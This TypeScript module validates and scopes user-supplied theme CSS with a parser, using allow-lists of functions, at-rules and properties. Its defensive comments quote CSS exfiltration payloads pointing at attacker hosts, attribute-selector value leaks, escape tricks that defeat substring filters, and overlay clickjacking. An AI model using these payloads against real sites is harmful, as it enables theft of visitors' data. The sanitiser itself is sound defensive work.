/**
 * The owner's free-form CSS: validated structurally, then scoped to its theme.
 *
 * ## What this is defending against
 *
 * Not the owner. The owner can already deface their own instance through
 * branding, and this feature exists because the token schema cannot cover every
 * component. Two other things:
 *
 * 1. **A theme pasted from the internet.** Themes export and import as JSON, so
 *    an owner can and will paste one somebody else wrote. Arbitrary CSS in a
 *    page is a data-exfiltration channel with no JavaScript involved: with
 *    `img-src 'self' data: https:` in the CSP — which remote posters require —
 *    `background-image: url(https://attacker/?x)` is permitted, and attribute
 *    selectors turn that into a character-by-character read of any input's value
 *    (`input[value^="a"] { background: url(…/a) }`). The victims are the
 *    instance's members, not the owner.
 * 2. **A stolen owner session.** Persistent, JavaScript-free exfiltration on
 *    every page for every member is a better foothold than most XSS, and it
 *    survives a password change. Hence `requireFreshAuth` on the route: this is
 *    a re-authenticate-to-change setting, like erasing an account.
 *
 * ## Why it parses instead of blocklisting substrings
 *
 * Because a substring blocklist for `url(` is not a defence. CSS lets an
 * identifier be escaped (`u\72 l(`), lets a comment sit inside a function name
 * (`ur/**\/l(`), is case-insensitive, and accepts `\0075` for `u`. Every one of
 * those defeats `includes('url(')` and none of them defeats a parser.
 *
 * `css-tree` is that parser, and this is the place the token schema's own note
 * predicted it would earn its keep — the token grammars turned out small enough
 * to hand-write, and this one is not.
 *
 * The rule is structural: the AST may contain no `Url` node anywhere, no
 * function outside an allow-list, no at-rule outside a short list, and none of a
 * very short list of refused properties — `position` above all, which is the one
 * attack that needs no exfiltration channel. See `REFUSED_PROPERTIES`.
 *
 * ## Why functions are allow-listed and not just `Url`
 *
 * Because "no `Url` node" is not the same as "no URL", and review found the gap
 * by trying it: css-tree produces a `Url` node for `url(…)` and nothing of the
 * sort for `image-set("https://evil/x" 1x)`, where the URL is a plain `String`
 * argument. That is not a css-tree quirk — CSS Images 4 genuinely lets these
 * functions take a bare string, and `image-set()` works in every browser this
 * application supports. `-webkit-image-set()`, `cross-fade()` and the newer
 * `src()` are the same shape. All four were accepted before this list existed,
 * which reopened precisely the exfiltration channel the module is here to close.
 *
 * Enumerating the url-bearing functions would repeat the mistake: `src()` is
 * recent, and the next one is not written yet. So the list runs the other way —
 * the functions theming legitimately needs, and nothing else. A new CSS function
 * that fetches is refused on the day it ships, without anybody noticing it
 * shipped.
 *
 * The cost is real and accepted: an owner using something unusual and harmless
 * gets refused, with the function named so the list can grow on evidence. That
 * is the same trade `ALLOWED_AT_RULES` already makes.
 *
 * Selectors are untouched by this. `:is()`, `:not()`, `:has()` and `:nth-child()`
 * parse as `PseudoClassSelector`, never as `Function` — verified rather than
 * assumed, because an allow-list that silently ate `:not()` would be worse than
 * the hole it closes.
 *
 * ## The property that makes this work at all
 *
 * The output is REGENERATED from the AST, never passed through. So a browser can
 * only ever see css-tree's interpretation of the input, which closes the whole
 * class of parser-differential attacks — there is no "css-tree read it as X and
 * Chrome reads it as Y", because Chrome never sees the original bytes.
 *
 * ## Two cases that are not obvious
 *
 * **Custom properties.** css-tree parses `--x: anything` as a `Raw` value, and
 * correctly so: custom properties have no grammar. But a `Raw` that is never
 * inspected is a hole, and a specific one — this application uses
 * `var(--bg-pattern-image)` in `background-image`, so `--bg-pattern-image:
 * url(https://evil)` would load. Custom property values are therefore reparsed
 * in a value context and walked like everything else.
 *
 * **`@keyframes` are global.** Selector prefixing cannot scope them, so a
 * theme's `@keyframes spin` would silently redefine an animation the rest of the
 * site — and every other theme — uses. Each declared name is renamed with the
 * theme's slug, and the `animation` / `animation-name` references inside the
 * same stylesheet are rewritten to match, so the feature keeps working and the
 * leak closes.
 */
import * as csstree from 'css-tree';

/** 16 kB per theme. Ten enabled themes ride in one stylesheet every visitor gets. */
export const MAX_CUSTOM_CSS_BYTES = 16 * 1024;

/**
 * At-rules that may appear.
 *
 * `@media`, `@supports` and `@container` are conditionals; `@keyframes` is
 * renamed and kept. The notable exclusions are deliberate: `@import` makes a
 * request (a cross-origin one is blocked by `style-src 'self'`, a same-origin
 * one is not, and this feature has no reason to make either), `@font-face`
 * would let a theme redefine a curated family out from under the font role that
 * selected it, `@property` registers a custom property globally with a syntax
 * and an inherit flag — changing how the application's own tokens cascade and
 * animate — and `@layer` is a global ordering directive that a stylesheet of
 * prefixed selectors gains nothing from.
 */
const ALLOWED_AT_RULES = new Set(['media', 'supports', 'container', 'keyframes']);

/**
 * Functions a theme may call.
 *
 * Grouped by what they are for, and deliberately closed — see the note above on
 * why this runs as an allow-list. Everything here is either arithmetic, a
 * colour, a gradient, a filter, a transform, an easing curve, a track size or a
 * shape: none of them can reference anything outside the document.
 *
 * Vendor-prefixed spellings are absent on purpose. Every function here is
 * unprefixed in every browser this application targets, and `-webkit-image-set`
 * is the reason the prefix is not simply stripped before the lookup.
 */
const ALLOWED_FUNCTIONS = new Set([
  // Substitution and arithmetic.
  'var', 'env', 'calc', 'min', 'max', 'clamp',
  'round', 'mod', 'rem', 'abs', 'sign',
  'pow', 'sqrt', 'hypot', 'log', 'exp',
  'sin', 'cos', 'tan', 'asin', 'acos', 'atan', 'atan2',
  // Colour.
  'rgb', 'rgba', 'hsl', 'hsla', 'hwb',
  'lab', 'lch', 'oklab', 'oklch',
  'color', 'color-mix', 'light-dark',
  // Gradients — the only image values a theme gets.
  'linear-gradient', 'radial-gradient', 'conic-gradient',
  'repeating-linear-gradient', 'repeating-radial-gradient',
  'repeating-conic-gradient',
  // Filters.
  'blur', 'brightness', 'contrast', 'drop-shadow', 'grayscale',
  'hue-rotate', 'invert', 'opacity', 'saturate', 'sepia',
  // Transforms.
  'matrix', 'matrix3d', 'perspective',
  'rotate', 'rotate3d', 'rotateX', 'rotateY', 'rotateZ',
  'scale', 'scale3d', 'scaleX', 'scaleY', 'scaleZ',
  'skew', 'skewX', 'skewY',
  'translate', 'translate3d', 'translateX', 'translateY', 'translateZ',
  // Easing.
  'cubic-bezier', 'steps', 'linear',
  // Track sizing.
  'minmax', 'repeat', 'fit-content',
  // Generated content.
  'counter', 'counters',
  // Basic shapes, for clip-path and shape-outside. Geometry only.
  'circle', 'ellipse', 'inset', 'polygon', 'path',
].map((f) => f.toLowerCase()));

/**
 * Properties refused outright.
 *
 * `position` is the interesting one, and it is here because the plan called UI
 * redressing "the most underestimated risk" — correctly, since unlike every
 * other CSS attack it needs no exfiltration channel at all. A `::before` at
 * `position: fixed; inset: 0` intercepts every click on the page, hides a
 * warning, or lays a convincing fake form over a real one. `frame-ancestors`
 * does not help: the CSS is *in* the page.
 *
 * The whole property rather than just `fixed`, because `absolute` on a
 * body-level selector covers the page just as well and a rule that catches one
 * spelling is a rule that teaches you to trust it. Repositioning elements is not
 * theming — this feature exists for the components the tokens do not reach, and
 * reaching them means colour, spacing, type and border, not layout surgery.
 *
 * This is the same line the repository already draws for member content:
 * `apps/web/app/utils/markdown.ts` allows nine style properties and notes
 * "Positioning / z-index / url-bearing props are deliberately absent". Owner CSS
 * gets more than nine properties, but not that one.
 *
 * `-moz-binding` and `behavior` are dead ways to load and run code, kept out
 * because they cost nothing to keep out.
 */
const REFUSED_PROPERTIES: Record<string, string> = {
  position:
    'position is not allowed: a fixed or absolutely positioned overlay can intercept every click on the page, and unlike anything else in CSS that needs no way of sending data anywhere. Use the tokens for appearance; layout changes belong in the interface.',
  '-moz-binding': '-moz-binding is not allowed: it loads and runs code.',
  behavior: 'behavior is not allowed: it loads and runs code.',
};

/** Properties that reference an animation by name. */
const ANIMATION_PROPS = /^(animation|animation-name|-webkit-animation|-webkit-animation-name)$/i;

export interface CssIssue {
  readonly line: number;
  readonly reason: string;
}

export type CssResult =
  | { readonly ok: true; readonly css: string }
  | { readonly ok: false; readonly issues: readonly CssIssue[] };

function lineOf(node: csstree.CssNode): number {
  return node.loc?.start.line ?? 0;
}

/**
 * Rewrite one selector so it only matches under the theme's root.
 *
 * `html` and `:root` are replaced rather than prefixed — `:root[data-theme='x']
 * html` matches nothing, since `html` has no `html` ancestor. Everything else,
 * `body` and `*` included, becomes a descendant.
 *
 * The slug is interpolated into a selector that is then reparsed, which would be
 * an injection point if a slug could contain a quote. `SLUG_PATTERN` in
 * `utils/themes.ts` is what makes that impossible: lowercase letters, digits and
 * single hyphens, enforced at creation and frozen afterwards.
 */
function scopeSelector(selector: string, slug: string): string {
  const root = `:root[data-theme='${slug}']`;
  const trimmed = selector.trim();
  const head = /^(html|:root)\b/i.exec(trimmed);
  return head ? root + trimmed.slice(head[0].length) : `${root} ${trimmed}`;
}

/**
 * Validate, rename the keyframes, regenerate. Does NOT scope — see
 * `scopeCustomCss`.
 *
 * The split is not tidiness. A theme's CSS has to be emitted under more than one
 * selector: its own `[data-theme='slug']`, and again under
 * `[data-theme='system']` when an admin maps that theme to a half of system
 * mode. Storing it pre-scoped would make the second emission a string
 * substitution on the slug, which is exactly the kind of thing that works until
 * an owner writes `.nocturne-card` and it does not.
 *
 * So what is STORED is validated and regenerated but unscoped, and scoping
 * happens per emission. The emitter still never has to trust the column, because
 * the column already went through the parser.
 *
 * Returns every problem at once, because the alternative is an owner fixing a
 * twenty-rule stylesheet one round trip at a time.
 */
export function sanitiseCustomCss(source: string, slug: string): CssResult {
  const issues: CssIssue[] = [];

  if (Buffer.byteLength(source, 'utf8') > MAX_CUSTOM_CSS_BYTES) {
    return {
      ok: false,
      issues: [
        {
          line: 0,
          reason: `Too long: ${MAX_CUSTOM_CSS_BYTES} bytes maximum, because every enabled theme's CSS is in the one stylesheet each visitor downloads.`,
        },
      ],
    };
  }

  let ast: csstree.CssNode;
  try {
    ast = csstree.parse(source, {
      positions: true,
      // Parse values and preludes into real nodes rather than leaving them as
      // `Raw`. Without this the walk below would see one opaque blob per
      // declaration and could not find a `url()` inside it.
      parseValue: true,
      parseRulePrelude: true,
      parseAtrulePrelude: true,
      onParseError(error) {
        issues.push({ line: error.line ?? 0, reason: `Could not parse: ${error.message}` });
      },
    });
  } catch (err) {
    return {
      ok: false,
      issues: [{ line: 0, reason: `Could not parse: ${(err as Error).message}` }],
    };
  }

  const urlRefusal =
    'url() is not allowed: it turns a stylesheet into a way of telling another server who visited this page, with no JavaScript needed.';

  const functionRefusal = (name: string) =>
    `${name}() is not allowed. A theme may call arithmetic, colour, gradient, ` +
    `filter, transform, easing, track-size and shape functions; anything else ` +
    `is refused, because some CSS functions take a URL as a plain string — ` +
    `image-set() and src() among them — and a list of the ones that do would be ` +
    `out of date by the next CSS release.`;

  /**
   * The two rules that apply to any value, wherever it appears.
   *
   * Shared so a custom property gets exactly the same treatment as a normal
   * declaration: the earlier version checked custom properties for `Url` only,
   * which let `--x: image-set("https://evil" 1x)` through — and the application
   * itself feeds custom properties into `background-image` via
   * `var(--bg-pattern-image)`, so that value would have been fetched.
   */
  function checkValue(value: csstree.CssNode, line: number) {
    csstree.walk(value, {
      enter(node) {
        if (node.type === 'Url') {
          issues.push({ line, reason: urlRefusal });
        } else if (node.type === 'Function') {
          if (!ALLOWED_FUNCTIONS.has(node.name.toLowerCase())) {
            issues.push({ line, reason: functionRefusal(node.name) });
          }
        }
      },
    });
  }

  /** Custom property values, reparsed. See the note on custom properties above. */
  function checkCustomProperty(node: csstree.Declaration) {
    const raw = node.value;
    if (raw.type !== 'Raw') return;
    let value: csstree.CssNode;
    try {
      value = csstree.parse(raw.value, { context: 'value', positions: false });
    } catch {
      issues.push({
        line: lineOf(node),
        reason: `${node.property}: not a value this can check, so not accepted.`,
      });
      return;
    }
    checkValue(value, lineOf(node));
  }

  csstree.walk(ast, {
    enter(node) {
      switch (node.type) {
        case 'Url':
          issues.push({ line: lineOf(node), reason: urlRefusal });
          break;
        case 'Function':
          // Reached for functions in declaration values AND in at-rule preludes
          // (`@media (min-width: calc(…))`). Selector pseudo-classes are a
          // different node type and never land here.
          if (!ALLOWED_FUNCTIONS.has(node.name.toLowerCase())) {
            issues.push({ line: lineOf(node), reason: functionRefusal(node.name) });
          }
          break;
        case 'Atrule':
          if (!ALLOWED_AT_RULES.has(node.name.toLowerCase())) {
            issues.push({
              line: lineOf(node),
              reason: `@${node.name} is not allowed. Permitted: ${[...ALLOWED_AT_RULES]
                .map((a) => '@' + a)
                .join(', ')}.`,
            });
          }
          break;
        case 'Declaration': {
          if (node.property.startsWith('--')) {
            checkCustomProperty(node);
            break;
          }
          const refusal = REFUSED_PROPERTIES[node.property.toLowerCase()];
          if (refusal) {
            issues.push({ line: lineOf(node), reason: refusal });
          }
          break;
        }
      }
    },
  });

  if (issues.length) return { ok: false, issues };

  // ── Rename the keyframes, then their references ──────────────────────
  const renamed = new Map<string, string>();
  csstree.walk(ast, {
    visit: 'Atrule',
    enter(node) {
      if (!node.name.toLowerCase().endsWith('keyframes')) return;
      const prelude = node.prelude;
      if (!prelude || prelude.type !== 'AtrulePrelude') return;
      for (const child of prelude.children) {
        if (child.type === 'Identifier' || child.type === 'String') {
          const from = child.type === 'String' ? child.value : child.name;
          const to = `${slug}-${from}`;
          renamed.set(from, to);
          Object.assign(child, { type: 'Identifier', name: to });
        }
      }
    },
  });

  if (renamed.size) {
    csstree.walk(ast, {
      visit: 'Declaration',
      enter(node) {
        if (!ANIMATION_PROPS.test(node.property)) return;
        csstree.walk(node.value, {
          visit: 'Identifier',
          enter(id) {
            const to = renamed.get(id.name);
            if (to) id.name = to;
          },
        });
      },
    });
  }

  return { ok: true, css: csstree.generate(ast) };
}

/**
 * Prefix every selector so the CSS only applies under one theme's root.
 *
 * Called at emit time, once per selector the theme needs to answer to — its own
 * slug, and `system` when it is mapped to a half of system mode.
 *
 * Input is assumed to have been through `sanitiseCustomCss` already. It is
 * parsed again here rather than manipulated as text, because a selector is not a
 * string with a prefix: `html`, `:root` and a comma-separated list each need
 * different handling, and a regex that gets two of the three right is worse than
 * no regex.
 */
export function scopeCustomCss(css: string, slug: string): string {
  if (!css.trim()) return '';
  let ast: csstree.CssNode;
  try {
    ast = csstree.parse(css, { parseRulePrelude: true });
  } catch {
    // Unreachable through the routes, and a silent drop rather than a broken
    // stylesheet if a row is ever edited by hand into something unparseable.
    return '';
  }
  csstree.walk(ast, {
    visit: 'Rule',
    enter(node) {
      if (node.prelude.type !== 'SelectorList') return;
      // Rules inside `@keyframes` have `from`/`to`/percentage preludes, not
      // selectors. Prefixing one produces `:root[data-theme='x'] from`, a valid
      // selector for an element called `from` — so the animation silently stops
      // working rather than failing loudly.
      if ((this.atrule?.name ?? '').toLowerCase().endsWith('keyframes')) return;
      for (const selectorItem of node.prelude.children) {
        const scoped = scopeSelector(csstree.generate(selectorItem), slug);
        Object.assign(selectorItem, csstree.parse(scoped, { context: 'selector' }));
      }
    },
  });
  return csstree.generate(ast);
}
